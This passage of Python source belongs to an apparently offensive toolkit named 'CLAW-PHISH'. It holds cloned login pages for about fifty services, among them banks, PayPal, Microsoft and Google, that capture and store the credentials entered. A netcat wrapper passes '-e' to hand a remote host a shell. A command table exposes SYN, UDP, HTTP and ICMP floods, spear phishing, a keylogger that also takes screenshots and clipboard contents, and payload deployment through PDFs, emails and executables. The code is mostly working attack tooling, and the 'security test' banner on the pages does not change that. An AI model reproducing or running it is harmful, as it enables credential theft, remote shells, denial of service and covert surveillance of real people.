            'paypal': self._paypal_template(),
            'amazon': self._amazon_template(),
            'netflix': self._netflix_template(),
            'spotify': self._spotify_template(),
            'whatsapp': self._whatsapp_template(),
            'telegram': self._telegram_template(),
            'discord': self._discord_template(),
            'tiktok': self._tiktok_template(),
            'snapchat': self._snapchat_template(),
            'reddit': self._reddit_template(),
            'github': self._github_template(),
            'gitlab': self._gitlab_template(),
            'protonmail': self._protonmail_template(),
            'yahoo': self._yahoo_template(),
            'slack': self._slack_template(),
            'zoom': self._zoom_template(),
            'teams': self._teams_template(),
            'wordpress': self._wordpress_template(),
            'shopify': self._shopify_template(),
            'steam': self._steam_template(),
            'roblox': self._roblox_template(),
            'twitch': self._twitch_template(),
            'epic_games': self._epic_games_template(),
            'minecraft': self._minecraft_template(),
            'xbox': self._xbox_template(),
            'playstation': self._playstation_template(),
            'cashapp': self._cashapp_template(),
            'venmo': self._venmo_template(),
            'chase': self._chase_template(),
            'wells_fargo': self._wells_fargo_template(),
            'office365': self._office365_template(),
            'onedrive': self._onedrive_template(),
            'icloud': self._icloud_template(),
            'adobe': self._adobe_template(),
            'dropbox': self._dropbox_template(),
            'pinterest': self._pinterest_template(),
            'duolingo': self._duolingo_template(),
            'onlyfans': self._onlyfans_template(),
            'bumble': self._bumble_template(),
            'tinder': self._tinder_template(),
            'custom': self._custom_template()
        }
        
        html = templates.get(platform, self._custom_template())
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_server(self):
        self.phishing_server.stop()
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def _facebook_template(self):
        return self._get_template("facebook", "#1877f2", "facebook")
    
    def _instagram_template(self):
        return self._get_template("instagram", "#0095f6", "Instagram")
    
    def _twitter_template(self):
        return self._get_template("twitter", "#1d9bf0", "X / Twitter")
    
    def _gmail_template(self):
        return self._get_template("gmail", "#1a73e8", "Gmail")
    
    def _linkedin_template(self):
        return self._get_template("linkedin", "#0a66c2", "LinkedIn")
    
    def _get_template(self, name: str, color: str, display_name: str) -> str:
        return f"""<!DOCTYPE html>
<html><head><title>{display_name}</title>
<style>
body{{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.login-box{{background:white;border-radius:8px;padding:20px;width:400px;box-shadow:0 2px 4px rgba(0,0,0,.1)}}
.logo{{color:{color};font-size:32px;text-align:center;margin-bottom:20px}}
input{{width:100%;padding:14px;margin:10px 0;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box}}
button{{width:100%;padding:14px;background:{color};color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}}
.warning{{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center;border-radius:4px;font-size:12px}}
</style>
</head>
<body>
<div class="login-box"><div class="logo">{display_name}</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def _microsoft_template(self):
        return self._get_template("microsoft", "#0078d4", "Microsoft")
    
    def _google_template(self):
        return self._get_template("google", "#4285f4", "Google")
    
    def _apple_template(self):
        return self._get_template("apple", "#0071e3", "Apple")
    
    def _paypal_template(self):
        return self._get_template("paypal", "#0070ba", "PayPal")
    
    def _amazon_template(self):
        return self._get_template("amazon", "#ff9900", "Amazon")
    
    def _netflix_template(self):
        return self._get_template("netflix", "#e50914", "NETFLIX")
    
    def _spotify_template(self):
        return self._get_template("spotify", "#1ed760", "Spotify")
    
    def _whatsapp_template(self):
        return self._get_template("whatsapp", "#25d366", "WhatsApp")
    
    def _telegram_template(self):
        return self._get_template("telegram", "#2aabee", "Telegram")
    
    def _discord_template(self):
        return self._get_template("discord", "#5865f2", "Discord")
    
    def _tiktok_template(self):
        return self._get_template("tiktok", "#fe2c55", "TikTok")
    
    def _snapchat_template(self):
        return self._get_template("snapchat", "#fffc00", "Snapchat")
    
    def _reddit_template(self):
        return self._get_template("reddit", "#ff4500", "Reddit")
    
    def _github_template(self):
        return self._get_template("github", "#24292f", "GitHub")
    
    def _gitlab_template(self):
        return self._get_template("gitlab", "#fc6d26", "GitLab")
    
    def _protonmail_template(self):
        return self._get_template("protonmail", "#505061", "ProtonMail")
    
    def _yahoo_template(self):
        return self._get_template("yahoo", "#410093", "Yahoo")
    
    def _slack_template(self):
        return self._get_template("slack", "#611f69", "Slack")
    
    def _zoom_template(self):
        return self._get_template("zoom", "#2d8cff", "Zoom")
    
    def _teams_template(self):
        return self._get_template("teams", "#5059e8", "Teams")
    
    def _wordpress_template(self):
        return self._get_template("wordpress", "#21759b", "WordPress")
    
    def _shopify_template(self):
        return self._get_template("shopify", "#96bf48", "Shopify")
    
    def _steam_template(self):
        return self._get_template("steam", "#67c1f5", "Steam")
    
    def _roblox_template(self):
        return self._get_template("roblox", "#e32c2c", "Roblox")
    
    def _twitch_template(self):
        return self._get_template("twitch", "#9146ff", "Twitch")
    
    def _epic_games_template(self):
        return self._get_template("epic_games", "#000000", "EPIC GAMES")
    
    def _minecraft_template(self):
        return self._get_template("minecraft", "#6b8c42", "Minecraft")
    
    def _xbox_template(self):
        return self._get_template("xbox", "#107c10", "Xbox")
    
    def _playstation_template(self):
        return self._get_template("playstation", "#003791", "PlayStation")
    
    def _cashapp_template(self):
        return self._get_template("cashapp", "#00d632", "Cash App")
    
    def _venmo_template(self):
        return self._get_template("venmo", "#008cff", "Venmo")
    
    def _chase_template(self):
        return self._get_template("chase", "#1174c2", "Chase")
    
    def _wells_fargo_template(self):
        return self._get_template("wells_fargo", "#bc1f2c", "Wells Fargo")
    
    def _office365_template(self):
        return self._get_template("office365", "#0078d4", "Office 365")
    
    def _onedrive_template(self):
        return self._get_template("onedrive", "#0078d4", "OneDrive")
    
    def _icloud_template(self):
        return self._get_template("icloud", "#0071e3", "iCloud")
    
    def _adobe_template(self):
        return self._get_template("adobe", "#ff0000", "Adobe")
    
    def _dropbox_template(self):
        return self._get_template("dropbox", "#0061ff", "Dropbox")
    
    def _pinterest_template(self):
        return self._get_template("pinterest", "#e60023", "Pinterest")
    
    def _duolingo_template(self):
        return self._get_template("duolingo", "#58cc71", "Duolingo")
    
    def _onlyfans_template(self):
        return self._get_template("onlyfans", "#000000", "OnlyFans")
    
    def _bumble_template(self):
        return self._get_template("bumble", "#ff6b6b", "Bumble")
    
    def _tinder_template(self):
        return self._get_template("tinder", "#ff5a60", "Tinder")
    
    def _custom_template(self):
        return """<!DOCTYPE html>
<html><head><title>Secure Login</title>
<style>
body{font-family:Arial;background:linear-gradient(135deg,#1a0000 0%,#4a0000 50%,#2d0000 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.login-box{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:16px;padding:40px;width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1)}
.logo{text-align:center;margin-bottom:30px;color:#ff3d3d;font-size:28px;font-weight:bold}
input{width:100%;padding:14px;margin:10px 0;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#fff;box-sizing:border-box;transition:all 0.3s}
input:focus{outline:none;border-color:#ff3d3d;background:rgba(255,255,255,0.08)}
button{width:100%;padding:14px;background:linear-gradient(135deg,#ff3d3d 0%,#8b0000 100%);color:white;border:none;border-radius:8px;cursor:pointer;font-weight:bold;font-size:16px;transition:all 0.3s}
button:hover{transform:scale(1.02);box-shadow:0 10px 30px rgba(255,61,61,0.3)}
.warning{margin-top:20px;padding:10px;background:rgba(255,0,0,0.1);border-radius:8px;color:#ff6b6b;text-align:center;font-size:12px}
</style>
</head>
<body>
<div class="login-box"><div class="logo">🦀 CLAW-PHISH</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Secure Login</button></form>
<div class="warning">🔒 Secure connection - Do not enter real credentials</div>
</div>
</body>
</html>"""

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            if scan_type == "quick":
                cmd = ['nmap', '-T4', '-F', target]
            elif scan_type == "full":
                cmd = ['nmap', '-p-', target]
            elif scan_type == "service":
                cmd = ['nmap', '-sV', target]
            elif scan_type == "os":
                cmd = ['nmap', '-O', target]
            else:
                cmd = ['nmap', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if method.upper() == "GET":
                cmd = ['curl', '-s', url]
            elif method.upper() == "POST":
                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
            else:
                cmd = ['curl', '-s', '-X', method, url]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=CLAW_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=CLAW_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        """Convert IP to domain name using reverse DNS"""
        try:
            # Try socket reverse lookup
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            
            # Try DNS resolver
            if DNS_AVAILABLE:
                try:
                    import dns.reversename
                    import dns.resolver
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        return str(answers[0]).rstrip('.')
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"IP to domain error: {e}")
            return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        """Convert domain to IP using DNS resolution"""
        try:
            # Try socket lookup
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            
            # Try DNS resolver
            if DNS_AVAILABLE:
                try:
                    import dns.resolver
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        return str(answers[0])
                except:
                    pass
            
            return None
        except Exception as e:
            logger.error(f"Domain to IP error: {e}")
            return None

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None, nikto: NiktoScanner = None,
                 dos_engine: DOSEngine = None, spear_phishing: SpearPhishingEngine = None,
                 agent_engine: AgentEngine = None, network_monitor: NetworkMonitor = None,
                 keylogger: KeyloggerEngine = None, deployment_engine: DeploymentEngine = None,
                 domain_hosting: DomainHostingEngine = None,
                 signal_bot: SignalBot = None, imessage_bot: iMessageBot = None,
                 google_chat: GoogleChatBot = None, whatsapp: WhatsAppBot = None):
        self.db = db
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.nikto = nikto
        self.dos = dos_engine
        self.spear = spear_phishing
        self.agent = agent_engine
        self.network_monitor = network_monitor
        self.keylogger = keylogger
        self.deployment = deployment_engine
        self.domain_hosting = domain_hosting
        self.signal = signal_bot
        self.imessage = imessage_bot
        self.google_chat = google_chat
        self.whatsapp = whatsapp
        self.social = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        return {
            # System Commands
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'report': self._report,
            'clear': self._clear,
            'help': self._help,
            'exit': self._exit,
            'quit': self._exit,
            
            # Ping Commands
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            
            # Nmap Commands
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            
            # Curl Commands
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            
            # Netcat Commands
            'nc': self._netcat,
            'netcat': self._netcat,
            'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan,
            
            # SSH Commands
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # Traffic Generation
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # Nikto Commands
            'nikto': self._nikto,
            'nikto_full': self._nikto_full,
            'nikto_ssl': self._nikto_ssl,
            
            # DOS Attacks
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            
            # Spear Phishing
            'spear_create': self._spear_create,
            'spear_send': self._spear_send,
            'spear_list': self._spear_list,
            
            # Agent Commands
            'agent_register': self._agent_register,
            'agent_command': self._agent_command,
            'agent_list': self._agent_list,
            'agent_status': self._agent_status,
            
            # Network Monitor
            'netmon_start': self._netmon_start,
            'netmon_stop': self._netmon_stop,
            'netmon_status': self._netmon_status,
            'netmon_packets': self._netmon_packets,
            
            # Keylogger
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # Deployment
            'deploy_pdf': self._deploy_pdf,
            'deploy_email': self._deploy_email,
            'deploy_link': self._deploy_link,
            'deploy_executable': self._deploy_executable,
            'deploy_list': self._deploy_list,
            'deploy_track': self._deploy_track,
            
            # Domain Hosting
            'ip_to_domain': self._ip_to_domain,
            'domain_to_ip': self._domain_to_ip,
            'host_domain': self._host_domain,
            'host_website': self._host_website,
            'list_domains': self._list_domains,
            'domain_info': self._domain_info,
            
            # Phishing Commands
            'phish': self._phish,
            'phish_facebook': lambda _: self._phish_platform('facebook'),
            'phish_instagram': lambda _: self._phish_platform('instagram'),
            'phish_twitter': lambda _: self._phish_platform('twitter'),
            'phish_gmail': lambda _: self._phish_platform('gmail'),
            'phish_linkedin': lambda _: self._phish_platform('linkedin'),
            'phish_microsoft': lambda _: self._phish_platform('microsoft'),
            'phish_google': lambda _: self._phish_platform('google'),
            'phish_apple': lambda _: self._phish_platform('apple'),
            'phish_paypal': lambda _: self._phish_platform('paypal'),
            'phish_amazon': lambda _: self._phish_platform('amazon'),
            'phish_netflix': lambda _: self._phish_platform('netflix'),
            'phish_spotify': lambda _: self._phish_platform('spotify'),
            'phish_whatsapp': lambda _: self._phish_platform('whatsapp'),
            'phish_telegram': lambda _: self._phish_platform('telegram'),
            'phish_discord': lambda _: self._phish_platform('discord'),
            'phish_tiktok': lambda _: self._phish_platform('tiktok'),
            'phish_snapchat': lambda _: self._phish_platform('snapchat'),
            'phish_reddit': lambda _: self._phish_platform('reddit'),
            'phish_github': lambda _: self._phish_platform('github'),
            'phish_gitlab': lambda _: self._phish_platform('gitlab'),
            'phish_protonmail': lambda _: self._phish_platform('protonmail'),
            'phish_yahoo': lambda _: self._phish_platform('yahoo'),
            'phish_slack': lambda _: self._phish_platform('slack'),
            'phish_zoom': lambda _: self._phish_platform('zoom'),
            'phish_teams': lambda _: self._phish_platform('teams'),
            'phish_wordpress': lambda _: self._phish_platform('wordpress'),
            'phish_shopify': lambda _: self._phish_platform('shopify'),
            'phish_steam': lambda _: self._phish_platform('steam'),
            'phish_roblox': lambda _: self._phish_platform('roblox'),
            'phish_twitch': lambda _: self._phish_platform('twitch'),
            'phish_epic_games': lambda _: self._phish_platform('epic_games'),
            'phish_minecraft': lambda _: self._phish_platform('minecraft'),
            'phish_xbox': lambda _: self._phish_platform('xbox'),
            'phish_playstation': lambda _: self._phish_platform('playstation'),
            'phish_cashapp': lambda _: self._phish_platform('cashapp'),
            'phish_venmo': lambda _: self._phish_platform('venmo'),
            'phish_chase': lambda _: self._phish_platform('chase'),
            'phish_wells_fargo': lambda _: self._phish_platform('wells_fargo'),
            'phish_office365': lambda _: self._phish_platform('office365'),
            'phish_onedrive': lambda _: self._phish_platform('onedrive'),
            'phish_icloud': lambda _: self._phish_platform('icloud'),
            'phish_adobe': lambda _: self._phish_platform('adobe'),
            'phish_dropbox': lambda _: self._phish_platform('dropbox'),
            'phish_pinterest': lambda _: self._phish_platform('pinterest'),
            'phish_duolingo': lambda _: self._phish_platform('duolingo'),
            'phish_onlyfans': lambda _: self._phish_platform('onlyfans'),
            'phish_bumble': lambda _: self._phish_platform('bumble'),
            'phish_tinder': lambda _: self._phish_platform('tinder'),
            'phish_custom': lambda _: self._phish_platform('custom'),
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_status': self._phish_status,
            'phish_creds': self._phish_creds,
            'phish_list': self._phish_list,
            
            # Network Commands
            'traceroute': self._traceroute,
            'whois': self._whois,
            'dns': self._dns,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'location': self._location,
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            
            # IP Management
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # Web Terminal Commands
            'web_start': self._web_start,
            'web_stop': self._web_stop,
            'web_status': self._web_status,
            
            # Platform Commands
            'discord_start': self._discord_start,
            'discord_stop': self._discord_stop,
            'telegram_start': self._telegram_start,
            'telegram_stop': self._telegram_stop,
            'slack_start': self._slack_start,
            'slack_stop': self._slack_stop,
            'signal_start': self._signal_start,
            'signal_stop': self._signal_stop,
            'whatsapp_start': self._whatsapp_start,
            'whatsapp_stop': self._whatsapp_stop,
            'platform_status': self._platform_status,
            'platform_list': self._platform_list,
            
            # Additional Python Commands
            'python': self._python,
            'python3': self._python3,
            'pip': self._pip,
            'pip3': self._pip3,
            'py': self._python,
            
            # Generic Command
            '!': self._generic,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(args)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== System Commands ====================
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
{Colors.PRIMARY}🦀 CLAW-PHISH System Status
{'='*40}{Colors.RESET}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Registered Agents: {stats.get('total_agents', 0)}
  Deployments: {stats.get('total_deployments', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _report(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        
        report = f"""
🦀 CLAW-PHISH Security Report
{'='*50}
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}

🚨 Recent Threats:
"""
        for t in threats[:5]:
            report += f"  • {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _exit(self, args: List[str]) -> Dict:
        return {'success': True, 'output': 'Exiting...', 'exit': True}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ACCENT}        🦀 CLAW-PHISH v5.0.0 - HELP MENU                            {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}📡 PING COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep entire network
║  fping <targets...>            - Fast ping multiple targets
║
║{Colors.SUCCESS}🔍 NMAP COMMANDS:{Colors.RESET}
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan (all ports)
║  nmap_os <target>              - OS detection scan
║  nmap_service <target>         - Service version detection
║  nmap_udp <target>             - UDP port scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth SYN scan
║
║{Colors.SUCCESS}🌐 CURL COMMANDS:{Colors.RESET}
║  curl <url>                    - HTTP request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_head <url>               - HEAD request
║  curl_options <url>            - OPTIONS request
║
║{Colors.SUCCESS}🔌 NETCAT COMMANDS:{Colors.RESET}
║  netcat <host> <port> [cmd]    - Connect to host/port
║  nc_listen <port>              - Listen on port
║  nc_scan <host> <ports>        - Port scan with netcat
║
